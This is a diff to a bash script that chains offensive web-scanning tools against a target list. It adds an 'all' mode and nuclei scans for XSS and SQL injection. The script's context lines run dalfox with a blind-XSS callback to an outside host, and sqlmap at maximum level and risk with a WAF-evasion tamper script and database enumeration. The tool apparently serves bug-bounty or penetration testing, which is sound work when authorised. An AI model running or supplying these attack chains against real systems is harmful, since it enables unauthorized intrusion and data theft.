@@ -6,12 +6,12 @@
 # Make directory for results
 mkdir -p Results
 
-
 targetList=""
 gfCall=false
 lfiCall=false
 xssCall=false
 sqliCall=false
+allCall=false
 
 # Function to display script usage and options
 showHelp() {
@@ -32,7 +32,7 @@ showHelp() {
 
 
 # Parse command-line options
-while getopts ":t:lgxsh" opt; do
+while getopts ":t:lgxsah" opt; do
   case ${opt} in
     t )
       targetList="$OPTARG"
@@ -48,6 +48,9 @@ while getopts ":t:lgxsh" opt; do
       ;;
     s )
       sqliCall=true
+      ;;
+    a )
+      allCall=true
       ;;
     h )
       showHelp
@@ -85,16 +88,20 @@ lfiAttack() {
 
 xssAttack() {
     dalfox -b hahwul.xss.ht file gfLists/xssGF | tee -a Results/xss
+
+    cat gfLists/xssGF | nuclei -tags xss | tee -a Results/xss
 }
 
 
 sqliAttack() {
     sqlmap -m gfLists/sqliGF --level 5 --risk 3 --batch --dbs --tamper=between | tee -a Results/sqli
+
+    cat gfLists/sqliGF | nuclei -tags sqli | tee -a Results/sqli 
 }
 
 
+# Main function to call other functions
 main () {
-
     if [ "$gfCall" = true ]; then
       gfListMaker
     fi
@@ -110,6 +117,10 @@ main () {
     if [ "$sqliCall" = true ]; then
       sqliAttack
     fi
-
+    if [ "$allCall" = true ]; then
+      lfiAttack
+      xssAttack
+      sqliAttack
+    fi
 }
 main
